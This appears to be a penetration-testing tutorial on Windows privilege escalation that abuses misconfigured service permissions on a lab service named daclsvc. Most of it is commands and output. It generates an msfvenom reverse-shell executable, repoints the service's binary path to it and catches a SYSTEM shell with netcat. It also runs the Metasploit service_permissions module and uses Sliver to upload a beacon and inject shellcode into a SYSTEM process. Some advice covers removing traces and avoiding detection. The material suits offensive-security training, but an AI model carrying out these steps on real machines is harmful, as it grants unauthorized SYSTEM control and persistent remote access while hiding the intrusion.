# Insecure Service Permission

## 01 - Manual

### 1.1 - Detect

Poorly configurations of some services that allows users to alter or overwrite the executable binary path that leads to full privileges. We use the the Windows builtin command line tool `sc.exe` that is called SCM (Service Control Manager) to manage the services.

#### 1.1.1 - Command Prompt

```
C:\> net user %username%
User name                    user
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/5/2020 7:32:00 AM
Password expires             Never
Password changeable          6/5/2020 7:32:00 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/25/2022 5:09:49 PM

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
```

First we enumerate to discover the `LocalSystem`.

```
C:\> wmic service get name,pathname,startname,startmode | findstr /i "localsystem" | findstr /i "c:\program files"
Name                                      PathName                                                                           StartMode  StartName
AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                 Auto       LocalSystem
AWSLiteAgent                              C:\Program Files\Amazon\XenTools\LiteAgent.exe                                     Auto       LocalSystem
daclsvc                                   "C:\Program Files\DACL Service\daclservice.exe"                                    Manual     LocalSystem
dllsvc                                    "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"                         Manual     LocalSystem
filepermsvc                               "C:\Program Files\File Permissions Service\filepermservice.exe"                    Manual     LocalSystem
regsvc                                    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"           Manual     LocalSystem
Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"         Manual     LocalSystem
unquotedsvc                               C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe        Manual     LocalSystem
WinDefend                                 "C:\Program Files\Windows Defender\MsMpEng.exe"                                    Manual     LocalSystem

C:\> wmic service list brief
ExitCode  Name                                      ProcessId  StartMode  State    Status
..[snip]..
0         CryptSvc                                  1308       Auto       Running
1077      CscService                                0          Disabled   Stopped  OK       
1077      daclsvc                                   0          Manual     Stopped  OK       
0         DcomLaunch                                852        Auto       Running  OK       
1077      defragsvc                                 0          Manual     Stopped  OK       
..[snip]..
```

We find the service name called `daclsvc` let's query it to see what privileges it has. We'll be running with a command `sc.exe` which is called SCM (Service Control Management) that it comes builtin in the Windows operating system.

This is the following syntax we're gonna use to enumerate:

`C:\> sc qc <servicesvc>`

```
C:\> sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

We can see the `SERVICE_START_NAME` runs with **SYSTEM** privileges that has `LocalSystem`. To verify even further we have two other methods to enumerate it in order to confirm that we can elevate it to higher level of privileges.

- **`icacls.exe` to view the ACL (Access Control Lists)**

```
C:\> icacls "C:\Program Files\DACL Service\daclservice.exe"
C:\Program Files\DACL Service\daclservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                              BUILTIN\Administrators:(I)(F)
                                              BUILTIN\Users:(I)(RX)
                                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Note that the `BUILTIN\Users:(I)(RX)` meant that it is configured into that can read and executable to users so in other words we can use the `sc.exe` command to start, stop and configure binary of the service. What you should look out for is `BUILTIN\Users:(I)(F)` that has granted the users full access so we can modify in that specific path or `BUILTIN\Users:(I)(RX)` should be enough so we can change the binary path to execute our malware.

- **Using `accesschk.exe` sysinternals tool**

This is following syntax when executing the sysinternal binary:

`C:\> accesschk.exe /accepteula -uwcqv <username> <servicesvc>`

```
C:\> accesschk.exe /accepteula -uwcqv %username% daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

When using a user account with least privileges let's say for example `user` that has a permission to modify the service configuration **SERVICE_CHANGE_CONFIG**. That indicates to all the last three methods we've tested that we can elevate it with **SYSTEM** privileges. This is just for you to understand how you can tell to exploit the misconfigured Windows service name that anything ends with the three letters **svc**.

#### 1.1.2 - Powershell

First we enumerate to discover the `LocalSystem`.

`PS C:\> Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`

This is the following syntax we're gonna use to enumerate:

`PS C:\> get-service <servicesvc> | format-list`

```
PS C:\> get-service daclsvc | format-list
get-service daclsvc | format-list


Name                : daclsvc
DisplayName         : DACL Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32OwnProcess
```

To verify even further we have one method to enumerate it in order to confirm that we can elevate it to higher level of privileges.

```
PS C:\> get-acl "C:\Program Files\DACL Service\daclservice.exe" | format-list


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\DACL Service\daclservice.exe
Owner  : BUILTIN\Administrators
Group  : WIN-QBA94KB3IOF\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  : 
Sddl   : O:BAG:S-1-5-21-3025105784-3259396213-1915610826-513D:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0
         x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)
```

Notice on the powershell cmdlet gave us with this particular line `BUILTIN\Users Allow ReadAndExecute, Synchronize` the word **"Allow"** and **"ReadAndExecute"** indicates that the users can configure it path of the service in anyway they want.

We can display more information to combine `Get-ACL` with `ConvertFrom-SddlString`

```
PS C:\> $acl = get-acl -path "C:\Program Files\DACL Service\daclservice.exe"
PS C:\> convertfrom-sddlstring -sddl $acl.sddl | foreach-object {$_.DiscretionaryAcl}
NT AUTHORITY\SYSTEM: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Users: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
```

We can shorten it into this.

`PS C:\> get-acl "C:\Program Files\DACL Service\daclservice.exe" | fl AccessToString`

Looks like powershell has a better way to give more information of what we can do with it.

### 1.2 - Exploit

From the enumeration phase we know this is a manual service start mode. So we have to enable it manually to receive a reverse shell connection since we have permission to do so. This is what the syntax looks like to modify the configuration to our reverse shell.

`C:\> sc config <servicesvc> binpath="<path_to_shell>"`

Generate a stageless reverse shell via `msfvenom` tool and then use any of the **file transfer techniques** then let's copy our reverse shell in the `C:\Temp` folder. Why stageless? The reason is if we use staged payloads it will stop the payload right away before it finishes which is why stageless payloads is a suitable job for this vector attack.

`$ msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=53 -f exe -o shell.exe`

- In command prompt

```
C:\> copy shell.exe c:\temp\

C:\> sc config daclsvc binpath="\"c:\temp\shell.exe"
```

- In powershell

```
PS C:\> copy-item shell.exe -destination c:\temp\

PS C:\> Set-Service -Name daclsvc -DisplayName "DACL Service"
```

And start the reverse shell handler with netcat

`$ sudo nc -lnvp 53`

Then execute the service manually

- In command prompt

```
C:\> net start daclsvc

C:\> sc start daclsvc
```

- In powershell

`PS C:\> Start-Service daclsvc`

We have elevated to `NT AUTHORITY\SYSTEM`

```
$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.145.32.
Ncat: Connection from 10.10.145.32:49859.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### 1.3 - Cleanup

Now let's revert back the original configuration to clear our trace ahead of time.

`C:\Windows\system32> sc config daclsvc binpath="\"C:\Program Files\DACL Service\daclservice.exe"`

Now for my final thoughts. Realistically not all services are set to manual. Something like this output error:

```
C:\> sc stop vulnerablesvc
System error 5 has occured.

Access is denied
```

When escalating to **SYSTEM** privileges you may not have the privileges to `start` or `stop` the service via `sc.exe` or `net.exe` so instead find the services that does contain **Auto** start mode instead of **Manual** when enumerating with `wmic` from the very first start of [[Windows Services|Enumeration and Discovery]] phase.

And you should have the privilege to shutdown/reboot the Windows workstation it's impossible not to have that. To confirm this `whoami /priv` command:

```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

After you have configured the the `binpath` for your reverse shell connection. Run this command to reboot the system:

`C:\> shutdown /r /t 0`

One last thing is that you don't need to use `accesschk.exe` because cybersecurity firms has now made it possible to detect the legitimate sysinternals suite toolkit that was made by microsoft. The developer had to include the `/accepteula` flag that will pop an event viewer alert ID but it's not always the case if the administrators are using it. This is why I've showed you a few ways to enumerate to break down step by step to further confirm that it is indeed exploitable. Use the other two previous methods other than the `accesschk.exe`.

## 02 - Metasploit

### 2.1 - Usage

- **MSF Windows Escalate Service Permissions Local Privilege Escalation Local Exploit Module**

```
msf > use exploit/windows/local/service_permissions

msf exploit(windows/local/service_permissions) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/service_permissions) > options

Module options (exploit/windows/local/service_permissions):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   AGGRESSIVE  false            no        Exploit as many services as possible (dangerous)
   SESSION                      yes       The session to run this module on
   TIMEOUT     10               yes       Timeout for WMI command in seconds


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target: 

   Id  Name 
   --  ---- 
   0   Automatic 



msf exploit(windows/local/service_permissions) > set lhost <IP>

msf exploit(windows/local/service_permissions) > set session <session_id>

msf exploit(windows/local/service_permissions) > set TargetServiceName <service_name>

msf exploit(windows/local/service_permissions) > run
```

- **Manually using metepreter `execute` command to start service**

```
meterpreter > execute -Hif sc -a "start <service_name>"
```

### 2.2 - Detect

```
meterpreter > shell
Process 3448 created.
Channel 5 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>wmic service get name,startname,pathname | findstr /i "localsystem" | findstr /i "C:\program files"
..[snip]..
daclsvc                              "C:\Program Files\DACL Service\daclservice.exe"                                            LocalSystem
..[snip]..

C:\Users\user>exit
exit
meterpreter > load extapi
Loading extension extapi...Success.
meterpreter > service_query daclsvc

Name        : daclsvc
Display     : DACL Service
Account     : LocalSystem
Status      : Stopped
Start Type  : Manual
Path        : "C:\Program Files\DACL Service\daclservice.exe"
L.O. Group  : 
Interactive : No
DACL        : D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPLORC;;;WD)
```

### 2.3 - Exploit

```
meterpreter > bg
[*] Backgrounding session 1...

Note: Give it a few a minutes or so since this will take long to get a session

msf6 exploit(multi/script/web_delivery) > use exploit/windows/local/service_permissions
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/service_permissions) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/service_permissions) > options

Module options (exploit/windows/local/service_permissions):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   AGGRESSIVE  false            no        Exploit as many services as possible (dangerous)
   SESSION                      yes       The session to run this module on
   TIMEOUT     10               yes       Timeout for WMI command in seconds


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/local/service_permissions) > set lhost 10.8.145.108
lhost => 10.8.145.108
msf6 exploit(windows/local/service_permissions) > set lport 53
lport => 53
msf6 exploit(windows/local/service_permissions) > set targetservicename daclsvc
targetservicename => daclsvc
msf6 exploit(windows/local/service_permissions) > set session 1
session => 1
msf6 exploit(windows/local/service_permissions) > exploit

[*] Started reverse TCP handler on 10.8.145.108:53 
[*] Trying to find weak permissions in existing services..
[+] [daclsvc]  has weak configuration permissions - reconfigured to use exe C:\Users\user\AppData\Local\Temp\ifPuAY.exe
[*] [daclsvc] Restarting service
[*] Sending stage (200774 bytes) to 10.10.229.49
[+] [daclsvc] Service restarted
[*] Meterpreter session 2 opened (10.8.145.108:53 -> 10.10.229.49:49259) at 2022-05-29 16:02:17 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 2.4 - Cleanup

`meterpreter > rm "C:\Users\user\AppData\Local\Temp\ifPuAY.exe"`

## 03 - Sliver

### 3.1 - Detect

```
sliver (WISE_DISGUISE) > whoami

Logon ID: TCM-PC\user
[*] Tasked beacon WISE_DISGUISE (a702113f)

sliver (WISE_DISGUISE) > sharpup audit ModifiableServices

[*] Tasked beacon WISE_DISGUISE (7a8b3c07)

[+] WISE_DISGUISE completed task 7a8b3c07

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Services ===
        Service 'daclsvc' (State: Stopped, StartMode: Manual)
        [X] Exception: Exception has been thrown by the target of an invocation.
        [X] Exception: Exception has been thrown by the target of an invocation.



[*] Completed Privesc Checks in 6 seconds
```

### 3.2 - Exploit

```
sliver (WISE_DISGUISE) > execute -o sc qc daclsvc

⚠️  Using --output in beacon mode, if the command blocks the task will never complete

[*] Tasked beacon WISE_DISGUISE (46511084)

[+] WISE_DISGUISE completed task 46511084

[*] Output:
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

sliver (WISE_DISGUISE) > execute -o icacls "C:\\Program Files\\DACL Service\\daclservice.exe"

⚠️  Using --output in beacon mode, if the command blocks the task will never complete

[*] Tasked beacon WISE_DISGUISE (281fe137)

[+] WISE_DISGUISE completed task 281fe137

[*] Output:
C:\Program Files\DACL Service\daclservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                              BUILTIN\Administrators:(I)(F)
                                              BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files


sliver (WISE_DISGUISE) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -f service

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[*] Implant saved to /home/user/DUAL_MEET.exe

sliver (WISE_DISGUISE) > upload DUAL_MEET.exe c:/users/user/documents/daclservice.exe

[*] Tasked beacon WISE_DISGUISE (178ab857)

[+] WISE_DISGUISE completed task 178ab857

[*] Wrote file to c:\users\user\documents\daclservice.exe

sliver (WISE_DISGUISE) > execute -o sc config daclsvc binpath= c:\\users\\user\\documents\\daclservice.exe

⚠️  Using --output in beacon mode, if the command blocks the task will never complete

[*] Tasked beacon WISE_DISGUISE (eba8c115)

[+] WISE_DISGUISE completed task eba8c115

[*] Output:
[SC] ChangeServiceConfig SUCCESS

sliver (WISE_DISGUISE) > execute -o sc qc daclsvc

⚠️  Using --output in beacon mode, if the command blocks the task will never complete

[*] Tasked beacon WISE_DISGUISE (e2a3ef2e)

[+] WISE_DISGUISE completed task e2a3ef2e

[*] Output:
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : c:\users\user\documents\daclservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

sliver (WISE_DISGUISE) > execute -o sc start daclsvc

[*] Tasked beacon WISE_DISGUISE (582eb35f)

[+] WISE_DISGUISE completed task 582eb35f

[*] Beacon c05b8872 DUAL_MEET - 10.10.207.66:49435 (TCM-PC) - windows/amd64 - Thu, 24 Nov 2022 08:12:41 EST

sliver (WISE_DISGUISE) > use c05b8872-483a-4cfe-9a99-aa7b185a1d71

[*] Active beacon DUAL_MEET (c05b8872-483a-4cfe-9a99-aa7b185a1d71)

sliver (DUAL_MEET) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Tasked beacon DUAL_MEET (f4e3ac1f)

[+] DUAL_MEET completed task f4e3ac1f
```

### 3.3 - Cleanup

```
sliver (DUAL_MEET) > ps

[*] Tasked beacon DUAL_MEET (f661fe30)

[+] DUAL_MEET completed task f661fe30

 Pid    Ppid   Owner                          Arch     Executable             Session
====== ====== ============================== ======== ====================== =========
 0      0                                              [System Process]
 4      0                                     x86_64   System
 404    4      NT AUTHORITY\SYSTEM            x86_64   smss.exe
 540    532    NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 588    532    NT AUTHORITY\SYSTEM            x86_64   wininit.exe
 596    580    NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 624    580    NT AUTHORITY\SYSTEM            x86_64   winlogon.exe
 684    588    NT AUTHORITY\SYSTEM            x86_64   services.exe
 692    588    NT AUTHORITY\SYSTEM            x86_64   lsass.exe
 704    588    NT AUTHORITY\SYSTEM            x86_64   lsm.exe
 788    684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 852    684    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 936    624    NT AUTHORITY\SYSTEM            x86_64   LogonUI.exe
 952    684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1004   684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 384    684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 544    684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1092   684    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 1224   684    NT AUTHORITY\SYSTEM            x86_64   spoolsv.exe
 1252   684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1364   684    NT AUTHORITY\SYSTEM            x86_64   amazon-ssm-agent.exe
 1476   684    NT AUTHORITY\SYSTEM            x86_64   LiteAgent.exe
 1504   684    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1652   684    NT AUTHORITY\SYSTEM            x86_64   Ec2Config.exe
 1952   684    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 1972   684    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 1064   788    NT AUTHORITY\NETWORK SERVICE   x86_64   WmiPrvSE.exe
 2588   684    NT AUTHORITY\SYSTEM            x86_64   TrustedInstaller.exe
 2820   2812   NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 2844   2812   NT AUTHORITY\SYSTEM            x86_64   winlogon.exe
 2132   684    TCM-PC\user                    x86_64   taskhost.exe
 2428   1092   TCM-PC\user                    x86_64   rdpclip.exe
 2616   1004   TCM-PC\user                    x86_64   dwm.exe
 2640   2476   TCM-PC\user                    x86_64   explorer.exe
 2008   684    NT AUTHORITY\SYSTEM            x86_64   SearchIndexer.exe
 2004   684    NT AUTHORITY\NETWORK SERVICE   x86_64   sppsvc.exe
 1460   684    NT AUTHORITY\NETWORK SERVICE   x86_64   wmpnetwk.exe
 4028   2572   TCM-PC\user                    x86_64   powershell.exe
 1384   2820   TCM-PC\user                    x86_64   conhost.exe
 3980   2640   TCM-PC\user                    x86_64   WISE_DISGUISE.exe
 4064   788    TCM-PC\user                    x86_64   slui.exe
 464    684    NT AUTHORITY\SYSTEM            x86_64   daclservice.exe


sliver (DUAL_MEET) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -G -a x64 -o windows -f shellcode

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[!] Shikata ga nai encoder is disabled
[*] Implant saved to /home/user/PRIOR_MATERIAL.bin

sliver (DUAL_MEET) > execute-shellcode -p 2588 PRIOR_MATERIAL.bin

[*] Tasked beacon DUAL_MEET (b48dc655)

[+] DUAL_MEET completed task b48dc655

[*] Executed shellcode on target

[*] Beacon 45cec58b PRIOR_MATERIAL - 10.10.207.66:49551 (TCM-PC) - windows/amd64 - Thu, 24 Nov 2022 08:20:55 EST

sliver (DUAL_MEET) > background

[*] Background ...
```

Terminate previous beacons

```
sliver > beacons rm

? Select a beacon: c05b8872-483a-4cfe-9a99-aa7b185a1d71  DUAL_MEET       10.10.207.66:49435  TCM-PC  NT AUTHORITY\SYSTEM  windows/amd64
[*] Beacon removed (c05b8872-483a-4cfe-9a99-aa7b185a1d71)

sliver > beacons rm

? Select a beacon: 4a088b24-2875-4d70-a917-1720715c2b22  WISE_DISGUISE   10.10.207.66:49340  TCM-PC  TCM-PC\user          windows/amd64
[*] Beacon removed (4a088b24-2875-4d70-a917-1720715c2b22)

sliver > use 45cec58b-dfc1-4a98-9396-1b68fd2fa49a

[*] Active beacon PRIOR_MATERIAL (45cec58b-dfc1-4a98-9396-1b68fd2fa49a)
```

Switch to interactive mode

```
sliver (PRIOR_MATERIAL) > interactive

[*] Using beacon's active C2 endpoint: mtls://10.9.19.98:8888
[*] Tasked beacon PRIOR_MATERIAL (e54aa8ec)

[*] Session 422db3d5 PRIOR_MATERIAL - 10.10.207.66:49634 (TCM-PC) - windows/amd64 - Thu, 24 Nov 2022 08:26:51 EST

sliver (PRIOR_MATERIAL) > sessions -i 4

[*] Active session PRIOR_MATERIAL (422db3d5)

sliver (PRIOR_MATERIAL) > terminate 3980

[*] Process 3980 has been terminated
```

## References

- [Windows Privilege Escalation Weak Services Permission](https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/)

- [Abuse Service Registry ACLs Windows Privesc](https://medium.com/r3d-buck3t/abuse-service-registry-acls-windows-privesc-f88079140509)

- [Insecure Service Permissions](https://www.adamcouch.co.uk/insecure-service-permissions/)

- [PentestLab Weak Service Permissions](https://pentestlab.blog/2017/03/30/weak-service-permissions/)